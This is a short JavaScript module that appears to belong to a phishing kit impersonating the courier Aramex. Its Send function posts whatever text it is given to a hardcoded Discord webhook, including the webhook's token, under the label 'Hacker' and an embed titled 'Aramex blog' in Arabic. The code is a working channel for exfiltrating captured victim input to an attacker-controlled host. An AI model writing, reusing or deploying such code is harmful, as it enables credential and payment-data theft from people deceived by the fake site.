import axios from 'axios';


const TeleSned = () => {
     
    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة اراميكس ",
              description: des,
           },
          ],
    };

        await axios.post("https://discord.com/api/webhooks/1313920131793027103/Lwuik8Ib3PFe5eSHws0EnL33xSBsOvH6hnSpzb4-f8NUqH1hbaSNCnbRbZTEoZoHmvln",body) 
    }
  return {
    Send,
}
}

export default TeleSned;
